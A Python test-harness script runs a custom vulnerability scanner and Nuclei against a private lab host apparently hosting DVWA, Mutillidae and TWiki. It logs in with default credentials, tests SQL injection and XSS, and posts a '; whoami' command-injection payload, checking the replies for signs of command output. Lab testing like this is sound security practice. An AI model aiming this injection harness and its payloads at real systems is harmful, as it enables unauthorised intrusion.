"""WVS v18.0 修复参数名后重新扫描"""
import sys, asyncio, aiohttp, json, time
sys.path.insert(0, r"C:\Users\HZR\.qclaw\workspace-agent-b7ed571b\wvs-v18")
from wvs.vuln.scanner_v18 import VulnerabilityScanner
from wvs.integrations import NucleiIntegration

TARGET = "http://192.168.18.131"
scanner = VulnerabilityScanner({"timeout": 15, "delay": 0.2})

async def full_scan():
    results = []

    async with aiohttp.ClientSession() as session:

        # === 1. DVWA Login ===
        print("[1] DVWA Authentication...")
        import re
        login_url = f"{TARGET}/dvwa/login.php"
        logged_in = False
        try:
            async with session.get(login_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                content = await resp.text()
                csrf_match = re.search(r'user_token.*?value=[\"\'](.*?)[\"\']', content, re.DOTALL)
                if csrf_match:
                    csrf = csrf_match.group(1)
                    print(f"  CSRF token: {csrf}")
                    login_data = {
                        "username": "admin",
                        "password": "password",
                        "Login": "Login",
                        "user_token": csrf
                    }
                    async with session.post(login_url, data=login_data, timeout=aiohttp.ClientTimeout(total=10)) as resp2:
                        text = await resp2.text()
                        if "index.php" in text or "Logout" in text:
                            print("  -> LOGIN SUCCESS!")
                            logged_in = True
                        else:
                            print("  -> LOGIN FAILED - need correct credentials")
                            print(f"     Response: {text[:300]}")
                else:
                    print("  -> No CSRF token found - DVWA may be down or reconfigured")
        except Exception as e:
            print(f"  -> Error: {e}")

        # === 2. SQLi (correct params) ===
        print("\n[2] SQL Injection Tests...")
        sqli_tests = []

        if logged_in:
            sqli_tests.append((f"{TARGET}/dvwa/vulnerabilities/sqli/", "id", "GET"))
        # Mutillidae doesn't have direct SQLi page, skip

        for url, param, method in sqli_tests:
            print(f"  Testing: {url}?{param}=...")
            try:
                vulns = await scanner.test_sqli(session, url, param, method)
                if vulns:
                    for v in vulns:
                        print(f"    [SQLi] {v.payload[:60]} (conf={v.confidence:.0%})")
                        results.append({"type": "SQLi", "url": url, "payload": v.payload, "confidence": v.confidence})
                else:
                    print(f"    Not found")
            except Exception as e:
                print(f"    Error: {e}")

        # === 3. XSS (correct params) ===
        print("\n[3] XSS Tests...")
        xss_tests = [
            (f"{TARGET}/dvwa/vulnerabilities/xss_r/", "name", "GET"),  # DVWA needs login
            (f"{TARGET}/mutillidae/index.php?page=add-to-your-blog.php", "add_to_your_blog", "POST"),
            (f"{TARGET}/twiki/bin/view/Main/", "topic", "GET"),
        ]

        for url, param, method in xss_tests:
            print(f"  Testing: {url} [{param}]")
            try:
                vulns = await scanner.test_xss(session, url, param)
                if vulns:
                    for v in vulns:
                        print(f"    [XSS] {v.payload[:60]} (conf={v.confidence:.0%}) sev={v.severity}")
                        results.append({"type": "XSS", "url": url, "payload": v.payload, "confidence": v.confidence, "severity": v.severity})
                else:
                    print(f"    Not found")
            except Exception as e:
                print(f"    Error: {e}")

        # === 4. CMDi (correct param: target_host + POST) ===
        print("\n[4] Command Injection Tests...")
        cmdi_tests = [
            (f"{TARGET}/mutillidae/index.php?page=dns-lookup.php", "target_host"),
            (f"{TARGET}/mutillidae/index.php?page=dns-lookup.php&target_host=;whoami", "target_host"),
        ]

        for url, param in cmdi_tests:
            print(f"  Testing: {url} [{param}]")
            try:
                # 手动发送 POST
                post_url = f"{TARGET}/mutillidae/index.php"
                # Baseline
                async with session.post(post_url, data={"target_host": "127.0.0.1", "dns-lookup-php-submit-button": "Lookup"}, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    baseline = await resp.text()
                    print(f"    Baseline: {resp.status}, len={len(baseline)}")

                # CMDi payload
                async with session.post(post_url, data={"target_host": "; whoami", "dns-lookup-php-submit-button": "Lookup"}, timeout=aiohttp.ClientTimeout(total=10)) as resp2:
                    content = await resp2.text()
                    print(f"    Injected: {resp2.status}, len={len(content)}")

                    if len(content) != len(baseline):
                        print(f"    -> LENGTH CHANGED! ({len(baseline)} -> {len(content)})")

                    # Search for command output
                    for pattern in ["www-data", "daemon", "root:", "uid=", "gid=", "apache", "bin/bash", "nobody"]:
                        if pattern in content and pattern not in baseline:
                            idx = content.index(pattern)
                            print(f"    -> CMD OUTPUT: '{pattern}' at pos {idx}")
                            print(f"       Context: ...{content[max(0,idx-30):idx+50]}...")
                            results.append({"type": "CMDi", "url": url, "payload": "; whoami", "evidence": pattern})

                    # Diff
                    if len(content) > len(baseline):
                        extra = content[len(baseline):]
                        if extra.strip():
                            print(f"    -> Extra: {extra[:200]}")

                # Also test via test_cmdi
                vulns = await scanner.test_cmdi(session, post_url + "?page=dns-lookup.php", "target_host")
                if vulns:
                    for v in vulns:
                        print(f"    [CMDi] {v.payload[:60]} (conf={v.confidence:.0%})")
                        results.append({"type": "CMDi", "url": url, "payload": v.payload, "confidence": v.confidence})
                else:
                    print(f"    test_cmdi: not found (GET vs POST issue)")
            except Exception as e:
                print(f"    Error: {e}")
                import traceback
                traceback.print_exc()

        # === 5. Nuclei ===
        print("\n[5] Nuclei Template Scan...")
        nuclei = NucleiIntegration()
        nuclei_results = nuclei.scan(f"{TARGET}/")
        print(f"  Found: {len(nuclei_results)}")
        for v in nuclei_results:
            print(f"    [{v.severity:8s}] {v.name}")
            results.append({"type": "Nuclei", "severity": v.severity, "name": v.name, "matched_at": v.matched_at})

    # Summary
    print("\n" + "=" * 60)
    print("FINAL SUMMARY")
    print("=" * 60)
    by_type = {}
    for r in results:
        t = r.get("type", "?")
        by_type[t] = by_type.get(t, 0) + 1
    for t, c in by_type.items():
        print(f"  {t}: {c}")
    print(f"  Total: {len(results)}")

    # Save
    import os
    os.makedirs("reports", exist_ok=True)
    with open("reports/v18_improved_scan.json", "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2, default=str)
    print(f"\nSaved: reports/v18_improved_scan.json")

asyncio.run(full_scan())
